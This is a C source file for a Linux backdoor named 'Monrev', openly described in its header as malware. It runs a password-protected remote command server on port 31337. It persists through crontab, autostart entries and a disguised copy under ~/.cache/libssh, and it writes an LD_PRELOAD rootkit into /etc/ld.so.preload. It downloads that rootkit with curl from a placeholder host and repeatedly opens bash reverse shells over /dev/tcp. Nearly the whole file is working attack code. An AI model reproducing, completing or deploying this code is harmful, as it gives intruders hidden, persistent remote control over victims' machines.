/**
 * @file mr.c
 * @author Gris Iscomeback
 * @brief A backdoor Posix malware to hide users, processes, directories, and files.
 *
 * @details This posix malware intercepts various system calls to hide specific users,
 * processes, directories, and files. It is designed to be loaded using LD_PRELOAD.
 *
 * @tested_on Kernel: 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 * @name Monrev
 * @malware_type backdoor
 **/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <dlfcn.h>
#include <sys/stat.h>
#include <libgen.h>

#define PORT 31337
#define BUFFER_SIZE 1024
#define MAX_COMMANDS 10
#define DESIRED_LD_PRELOAD "/home/.grisun0/mrhyde.so"
#define PID_FILE "/dev/shm/pid"
#define HIDE_FILE "/dev/shm/file"
#define KEY_FILE "/dev/shm/key"
#define PASSWORD "grisiscomebacksayknokknok"
#define PATH_MAX 4096

typedef struct {
    char *command;
    char *description;
    int argc;
} Command;

typedef struct {
    char *data;
    size_t size;
    char *name;
} VirtualFile;

VirtualFile *mem_storage[MAX_COMMANDS];
size_t mem_storage_size = 0;
int is_alive = 1;
time_t start_date;
void reboot_system();
int should_monitor = 1;
void *rootkit_handle = NULL;

Command commands[] = {
    {"WRITE", "write file to mem", 2},
    {"READ", "read file from mem/disk", 1},
    {"DELETE", "delete file from mem", 1},
    {"DIR", "list all files on mem", 0},
    {"HELP", "print this screen", 0},
    {"QUIT", "close this session", 0},
    {"REBOOT", "stopping and restarting the system", 0},
    {"SHUTDOWN", "close down the system", 0},
    {"UPTIME", "print how long the system has been running", 0},
    {"REV", "send a reverse shell to the ip/port passed like an argument", 0},
    {"MRHYDE", "Download MrHyde Rootkit", 0},
    {"CLEAN", "CLEAN MrHyde Rootkit", 0},
    {"STOP", "STOP MrHyde Rootkit", 0},
    {"START", "START MrHyde Rootkit", 0},
    {"INFECT", "Set LD_PRELOAD and append to files", 0},
    {"LOAD", "Load MrHyde Rootkit", 0},
    {"UNLOAD", "Unload MrHyde Rootkit", 0},
    {"HIDE", "Hide PIDs", 1},
};

char *get_ld_preload() {
    return getenv("LD_PRELOAD");
}
void set_ld_preload(const char *ld_preload) {
    FILE *profile = fopen("/etc/profile", "a");
    if (profile) {
        fprintf(profile, "export LD_PRELOAD=%s\n", ld_preload);
        fclose(profile);
    }

    FILE *ld_preload_file = fopen("/etc/ld.so.preload", "a");
    if (ld_preload_file) {
        fprintf(ld_preload_file, "%s\n", ld_preload);
        fclose(ld_preload_file);
    }
}
void ensure_ld_preload() {
    char *current_ld_preload = get_ld_preload();
    if (current_ld_preload == NULL || strcmp(current_ld_preload, DESIRED_LD_PRELOAD) != 0) {
        printf("LD_PRELOAD setted as %s\n", DESIRED_LD_PRELOAD);
        set_ld_preload(DESIRED_LD_PRELOAD);
        pid_t pid = fork();
        if (pid == 0) {
            execl("/bin/bash", "bash", "-c", "sudo bash -c 'echo \"export LD_PRELOAD=/home/.grisun0/mrhyde.so\" > /etc/profile.d/ld_preload.sh'", (char *)NULL);
            perror("execl failed");
            exit(EXIT_FAILURE);
        } else if (pid < 0) {
            perror("fork failed");
        } else {
            waitpid(pid, NULL, 0);
        }
    }
}
void ensure_pid_file_exists() {
    const char *filepath = PID_FILE;
    FILE *file = fopen(filepath, "r");

    if (file == NULL) {
        char command[256];
        snprintf(command, sizeof(command),
                 "ps aux | grep -Ei '(.*{lhost}.*|.*grisun0.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid");
        FILE *cmd = popen(command, "r");
        if (cmd == NULL) {
            perror("popen failed");
            exit(EXIT_FAILURE);
        }
        pclose(cmd);
    } else {
        fclose(file);
    }
}

int check_elevate() {
    if (geteuid() == 0) {
        printf("[CheckElevate] Running as ROOT\n");
        return 1;
    }
    printf("[CheckElevate] Running as USER\n");
    return 0;
}

void write_file(const char *path, const char *content, mode_t mode) {
    FILE *file = fopen(path, "w");
    if (file == NULL) {
        perror("Failed to open file");
        return;
    }
    fprintf(file, "%s", content);
    fclose(file);
    chmod(path, mode);
}

void crontab(const char *path) {
    const char *tmp_path = "/tmp/crontab_tmp";
    char command[PATH_MAX];
    snprintf(command, sizeof(command), "@reboot %s\n", path);
    write_file(tmp_path, command, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);

    snprintf(command, sizeof(command), "crontab %s", tmp_path);
    system(command);

    remove(tmp_path);
}

char *generate_random_string() {
    srand(time(NULL));
    char *str = malloc(9);
    for (int i = 0; i < 8; i++) {
        str[i] = 'a' + rand() % 26;
    }
    str[8] = '\0';
    return str;
}

void xdg(const char *path, int admin) {
    char *filename = generate_random_string();
    char conf[PATH_MAX];
    char desktop_path[PATH_MAX];

    snprintf(conf, sizeof(conf),
             "[Desktop Entry]\n"
             "Type=Application\n"
             "Name=%s\n"
             "Exec=%s\n"
             "Terminal=false", filename, path);

    if (admin) {
        snprintf(desktop_path, sizeof(desktop_path), "/etc/xdg/autostart/%s.desktop", filename);
    } else {
        snprintf(desktop_path, sizeof(desktop_path), "%s/.config/autostart/%s.desktop", getenv("HOME"), filename);
    }

    write_file(desktop_path, conf, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    free(filename);
}

void kde_plasma(const char *path) {
    char *filename = generate_random_string();
    char script_path[PATH_MAX];

    snprintf(script_path, sizeof(script_path), "%s/.config/autostart-scripts/%s.sh", getenv("HOME"), filename);

    const char *content = "#!/bin/sh\n"
                          "exec %s";
    char full_content[PATH_MAX];
    snprintf(full_content, sizeof(full_content), content, path);

    write_file(script_path, full_content, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH | S_IXUSR | S_IXGRP | S_IXOTH);
    free(filename);
}

void copy_binary(const char *source, const char *destination) {
    FILE *src = fopen(source, "rb");
    FILE *dest = fopen(destination, "wb");
    if (src == NULL || dest == NULL) {
        perror("Failed to open file");
        return;
    }

    char buffer[1024];
    size_t bytesRead;
    while ((bytesRead = fread(buffer, 1, sizeof(buffer), src)) > 0) {
        fwrite(buffer, 1, bytesRead, dest);
    }

    fclose(src);
    fclose(dest);
    chmod(destination, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH | S_IXUSR | S_IXGRP | S_IXOTH);
}

void persist(const char *path) {
    int elevated = check_elevate();
    if (elevated) {
        xdg(path, 1);
        crontab(path);
        kde_plasma(path);
    } else {
        xdg(path, 0);
        crontab(path);
        kde_plasma(path);
    }
    char new_path[PATH_MAX];
    snprintf(new_path, sizeof(new_path), "%s/.cache/libssh/libssh", getenv("HOME"));
    mkdir(dirname(new_path), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
    copy_binary(path, new_path);
}



void ensure_key_file_exists() {
    const char *filepath = KEY_FILE;
    FILE *file = fopen(filepath, "r");

    if (file == NULL) {
        char command[256];
        snprintf(command, sizeof(command),
                 "touch /dev/shm/key");
        FILE *cmd = popen(command, "r");
        if (cmd == NULL) {
            perror("popen failed");
            exit(EXIT_FAILURE);
        }
        pclose(cmd);
    } else {
        fclose(file);
    }
}
void ensure_hide_file_exists() {
    const char *filepath = HIDE_FILE;
    FILE *file = fopen(filepath, "r");

    if (file == NULL) {
        char command[256];
        snprintf(command, sizeof(command),
                 "touch /dev/shm/file");
        FILE *cmd = popen(command, "r");
        if (cmd == NULL) {
            perror("popen failed");
            exit(EXIT_FAILURE);
        }
        pclose(cmd);
    } else {
        fclose(file);
    }
}
void infect_command() {
    const char *path;
    char buf[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", buf, sizeof(buf)-1);
    if (len != -1) {
        buf[len] = '\0';
        path = buf;
    } else {
        perror("readlink");
        return;
    }
    persist(path);
    set_ld_preload(DESIRED_LD_PRELOAD);
}
void load_rootkit() {
    if (rootkit_handle == NULL) {
        rootkit_handle = dlopen(DESIRED_LD_PRELOAD, RTLD_NOW);
        if (rootkit_handle == NULL) {
            fprintf(stderr, "Error loading rootkit: %s\n", dlerror());
        } else {
            printf("Rootkit loaded successfully\n");
        }
    }
}

void unload_rootkit() {
    if (rootkit_handle != NULL) {
        dlclose(rootkit_handle);
        rootkit_handle = NULL;
        printf("Rootkit unloaded successfully\n");
    }
}
void *handle_client(void *client_socket) {
    int sock = *(int *)client_socket;
    free(client_socket);
    char buffer[BUFFER_SIZE];
    char *token;
    char *args[MAX_COMMANDS];
    int argc;

    send(sock, "Enter password: ", 16, 0);
    memset(buffer, 0, BUFFER_SIZE);
    if (recv(sock, buffer, BUFFER_SIZE, 0) <= 0) {
        close(sock);
        pthread_exit(NULL);
    }

    buffer[strcspn(buffer, "\n")] = 0;
    if (strcmp(buffer, PASSWORD) != 0) {
        send(sock, "Incorrect password. Connection closed.\n", 36, 0);
        close(sock);
        pthread_exit(NULL);
    }
    send(sock, "LazyOs release 0.1.1\n%> ", 30, 0);

    while (is_alive) {
        memset(buffer, 0, BUFFER_SIZE);
        if (recv(sock, buffer, BUFFER_SIZE, 0) <= 0) break;

        token = strtok(buffer, " \n");
        argc = 0;
        while (token != NULL) {
            args[argc++] = token;
            token = strtok(NULL, " \n");
        }

        if (strcmp(args[0], "WRITE") == 0) {
            if (argc >= 3) {
                VirtualFile *file = malloc(sizeof(VirtualFile));
                file->data = strdup(args[2]);
                file->size = strlen(args[2]);
                file->name = strdup(args[1]);
                mem_storage[argc - 1] = file;
                mem_storage_size += file->size;
                send(sock, "WRITE: Saved to mem file\n%> ", 30, 0);
            } else {
                send(sock, "WRITE: Not enough parameters\n%> ", 33, 0);
            }
        } else if (strcmp(args[0], "READ") == 0) {
            if (argc >= 2) {
                for (int i = 0; i < MAX_COMMANDS; i++) {
                    if (mem_storage[i] != NULL && strcmp(mem_storage[i]->name, args[1]) == 0) {
                        send(sock, mem_storage[i]->data, mem_storage[i]->size, 0);
                        send(sock, "\n%> ", 4, 0);
                        break;
                    }
                }
                send(sock, "READ: File not found\n%> ", 24, 0);
            } else {
                send(sock, "READ: Not enough parameters\n%> ", 32, 0);
            }
        } else if (strcmp(args[0], "REV") == 0) {
            if (argc >= 2) {
                pid_t pid = fork();
                if (pid == 0) {
                    char command[BUFFER_SIZE];
                    snprintf(command, BUFFER_SIZE, "nohup bash -i >& /dev/tcp/%s 0>&1", args[1]);
                    char *command_args[] = {"bash", "-c", command, NULL};
                    execvp("bash", command_args);
                    perror("execvp failed");
                    exit(EXIT_FAILURE);
                } else if (pid < 0) {
                    perror("fork failed");
                } else {
                    waitpid(pid, NULL, 0);
                }
            } else {
                send(sock, "REV: Not enough parameters\n%> ", 31, 0);
            }
        } else if (strcmp(args[0], "DELETE") == 0) {
            if (argc >= 2) {
                for (int i = 0; i < MAX_COMMANDS; i++) {
                    if (mem_storage[i] != NULL && strcmp(mem_storage[i]->name, args[1]) == 0) {
                        mem_storage_size -= mem_storage[i]->size;
                        free(mem_storage[i]->data);
                        free(mem_storage[i]->name);
                        free(mem_storage[i]);
                        mem_storage[i] = NULL;
                        send(sock, "DELETE: Removed mem file\n%> ", 30, 0);
                        break;
                    }
                }
                send(sock, "DELETE: Unable to find mem file\n%> ", 36, 0);
            } else {
                send(sock, "DELETE: Not enough parameters\n%> ", 34, 0);
            }
        } else if (strcmp(args[0], "DIR") == 0) {
            char response[BUFFER_SIZE];
            snprintf(response, BUFFER_SIZE, "DIR: There are %d file(s) that sum to %zu bytes of memory\n", MAX_COMMANDS, mem_storage_size);
            send(sock, response, strlen(response), 0);
            for (int i = 0; i < MAX_COMMANDS; i++) {
                if (mem_storage[i] != NULL) {
                    snprintf(response, BUFFER_SIZE, "File: %s, Size: %zu bytes\n", mem_storage[i]->name, mem_storage[i]->size);
                    send(sock, response, strlen(response), 0);
                }
            }
            send(sock, "%> ", 3, 0);
        } else if (strcmp(args[0], "HELP") == 0) {
            char response[BUFFER_SIZE];
            snprintf(response, BUFFER_SIZE, "LazyOs release 0.1.1\n");
            send(sock, response, strlen(response), 0);
            for (int i = 0; i < sizeof(commands) / sizeof(commands[0]); i++) {
                snprintf(response, BUFFER_SIZE, "%s: %s\n", commands[i].command, commands[i].description);
                send(sock, response, strlen(response), 0);
            }
            send(sock, "%> ", 3, 0);
        } else if (strcmp(args[0], "QUIT") == 0) {
            send(sock, "Bye!\n", 5, 0);
            break;
        } else if (strcmp(args[0], "REBOOT") == 0) {
            send(sock, "Server is rebooting!\n", 22, 0);
            raise(SIGTERM);
        } else if (strcmp(args[0], "STOP") == 0) {
            send(sock, "Server is stopping monitoring!\n", 31, 0);
            should_monitor = 0;
        } else if (strcmp(args[0], "LOAD") == 0) {
            load_rootkit();
            send(sock, "LOAD: Rootkit loaded\n%> ", 24, 0);
        } else if (strcmp(args[0], "UNLOAD") == 0) {
            unload_rootkit();
            send(sock, "UNLOAD: Rootkit unloaded\n%> ", 26, 0);
        } else if (strcmp(args[0], "START") == 0) {
            send(sock, "Server is starting monitoring!\n", 30, 0);
            should_monitor = 1;
        } else if (strcmp(args[0], "CLEAN") == 0) {
            send(sock, "Server is Cleaning!\n", 22, 0);
            unsetenv("LD_PRELOAD");
            FILE *preload_file = fopen("/etc/ld.so.preload", "w");
            if (preload_file) {
                fclose(preload_file);
            }
            if (remove("/home/.grisun0/mrhyde.so") == 0) {
                send(sock, "File /home/.grisun0/mrhyde.so deleted successfully.\n", 47, 0);
            } else {
                send(sock, "Failed to delete /home/.grisun0/mrhyde.so.\n", 41, 0);
            }
            send(sock, "Cleaning completed.\n%> ", 27, 0);
        } else if (strcmp(args[0], "INFECT") == 0) {
            infect_command();
            send(sock, "INFECT: LD_PRELOAD set and appended to files\n%> ", 47, 0);
        } else if (strcmp(args[0], "MRHYDE") == 0) {
            send(sock, "Server is MrHyDe!\n", 22, 0);
            pid_t pid = fork();
            if (pid == 0) {
                char command[BUFFER_SIZE];
                snprintf(command, BUFFER_SIZE, "curl -o /home/.grisun0/mrhyde.so http://{lhost}/mrhyde.so");
                char *command_args[] = {"bash", "-c", command, NULL};
                execvp("bash", command_args);
                ensure_ld_preload();
                perror("execvp failed");
                exit(EXIT_FAILURE);
            } else if (pid < 0) {
                perror("fork failed");
            } else {
                waitpid(pid, NULL, 0);
            }
        } else if (strcmp(args[0], "SHUTDOWN") == 0) {
            is_alive = 0;
            send(sock, "Server is shutting down!\n", 25, 0);
            raise(SIGTERM);
        } else if (strcmp(args[0], "UPTIME") == 0) {
            time_t current_time;
            time(&current_time);
            char response[BUFFER_SIZE];
            snprintf(response, BUFFER_SIZE, "UPTIME: Up %ld seconds\n%> ", (long)(current_time - start_date));
            send(sock, response, strlen(response), 0);
        } else if (strcmp(args[0], "HIDE") == 0) {
            send(sock, "Server is HIDE!\n", 22, 0);
            pid_t pid = fork();
            if (pid == 0) {
                char command[BUFFER_SIZE];
                snprintf(command, BUFFER_SIZE, "ps aux | grep -Ei '(.*{lhost}.*|.*{line}.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid");
                printf("ps aux | grep -Ei '(.*{lhost}.*|.*{line}.*|.*{line}.*|.*monrev.*|l_{line}.*|.*{line}_service\\.sh.*)' | awk '{print $2}' | xargs -I {} echo \"\\\"{}\\\",\" >> /dev/shm/pid");
                char *command_args[] = {"bash", "-c", command, NULL};
                execvp("bash", command_args);
                ensure_ld_preload();
                perror("execvp failed");
                exit(EXIT_FAILURE);
            } else if (pid < 0) {
                perror("fork failed");
            } else {
                waitpid(pid, NULL, 0);
            }
        } else {
            send(sock, "KERNEL: Unknown command\n%> ", 28, 0);
        }
    }

    close(sock);
    pthread_exit(NULL);
}

void *mon_shell(void *data) {
    while (1) {
        ensure_pid_file_exists();
        ensure_hide_file_exists();
        ensure_key_file_exists();
        if (!should_monitor) {
            sleep(1);
            continue;
        }
        int process_found = 0;
        DIR *dir;
        struct dirent *entry;

        dir = opendir("/proc");
        if (dir == NULL) {
            perror("opendir");
            continue;
        }

        while ((entry = readdir(dir)) != NULL) {
            if (entry->d_type == DT_DIR) {
                char path[256];
                snprintf(path, sizeof(path), "/proc/%s/comm", entry->d_name);
                FILE *file = fopen(path, "r");
                if (file) {
                    char process_name[256];
                    if (fgets(process_name, sizeof(process_name), file) != NULL) {
                        process_name[strcspn(process_name, "\n")] = 0;
                        if (strcmp(process_name, "{line}") == 0) {
                            process_found = 1;
                            break;
                        }
                    }
                    fclose(file);
                }
            }
        }
        closedir(dir);

        char *ld_preload = getenv("LD_PRELOAD");
        if (ld_preload == NULL || strcmp(ld_preload, DESIRED_LD_PRELOAD) != 0) {
            if (access(DESIRED_LD_PRELOAD, F_OK) != 0) {
                pid_t pid = fork();
                if (pid == 0) {
                    setsid();
                    char command[BUFFER_SIZE];
                    snprintf(command, BUFFER_SIZE, "curl -o /home/.grisun0/mrhyde.so http://{lhost}/mrhyde.so");
                    char *command_args[] = {"bash", "-c", command, NULL};
                    execvp("bash", command_args);
                    perror("execvp failed");
                    exit(EXIT_FAILURE);
                } else if (pid < 0) {
                    perror("fork failed");
                } else {
                    waitpid(pid, NULL, 0);
                }
            }
            setenv("LD_PRELOAD", DESIRED_LD_PRELOAD, 1);
        }

        if (!process_found) {
            pid_t pid = fork();
            if (pid == 0) {
                setsid();
                char command[BUFFER_SIZE];
                snprintf(command, BUFFER_SIZE, "nohup bash -i >& /dev/tcp/{lhost}/6666 0>&1");
                char *command_args[] = {"bash", "-c", command, NULL};
                execvp("bash", command_args);

                char command2[BUFFER_SIZE];
                snprintf(command2, BUFFER_SIZE, "nohup ./{line} &");
                char *command_args2[] = {"bash", "-c", command2, NULL};
                execvp("bash", command_args2);

                perror("execvp failed");
                exit(EXIT_FAILURE);
            } else if (pid < 0) {
                perror("fork failed");
            } else {
                waitpid(pid, NULL, 0);
            }
        }

        sleep(5);
    }
    return NULL;
}

void signal_handler(int signum) {
    if (signum == SIGTERM) {
        reboot_system();
    }
}

void reboot_system() {
    char command[BUFFER_SIZE];
    snprintf(command, BUFFER_SIZE, "curl -o /home/.grisun0/mrhyde.so http://{lhost}/mrhyde.so");
    char *command_args[] = {"bash", "-c", command, NULL};
    execvp("bash", command_args);
    perror("execvp failed");
    exit(EXIT_FAILURE);

    char *ld_preload = getenv("LD_PRELOAD");
    if (ld_preload == NULL || strcmp(ld_preload, DESIRED_LD_PRELOAD) != 0) {
        setenv("LD_PRELOAD", DESIRED_LD_PRELOAD, 1);
    }

    char *argv[] = {"nohup ./monrev", NULL};
    execvp(argv[0], argv);
    perror("execvp failed");

    char command2[BUFFER_SIZE];
    snprintf(command2, BUFFER_SIZE, "nohup ./{line} &");
    char *command_args2[] = {"bash", "-c", command2, NULL};
    execvp("bash", command_args2);
    exit(EXIT_FAILURE);
}

int main() {
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork failed");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        exit(EXIT_SUCCESS);
    }

    setsid();

    int server_fd, new_socket;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);
    pthread_t client_thread, mon_thread;
    signal(SIGTERM, signal_handler);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

    if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &opt, sizeof(opt))) {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(PORT);

    if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }

    if (listen(server_fd, 3) < 0) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    time(&start_date);

    if (pthread_create(&mon_thread, NULL, mon_shell, NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }

    printf("Monitoring started!\n");
    ensure_ld_preload();
    while (is_alive) {
        if ((new_socket = accept(server_fd, (struct sockaddr *)&address, (socklen_t*)&addrlen)) < 0) {
            perror("accept");
            exit(EXIT_FAILURE);
        }

        int *client_socket = malloc(sizeof(int));
        *client_socket = new_socket;

        if (pthread_create(&client_thread, NULL, handle_client, (void *)client_socket) < 0) {
            perror("could not create thread");
            exit(EXIT_FAILURE);
        }

        pthread_detach(client_thread);
        ensure_ld_preload();
    }

    pthread_join(mon_thread, NULL);
    close(server_fd);
    return 0;
}
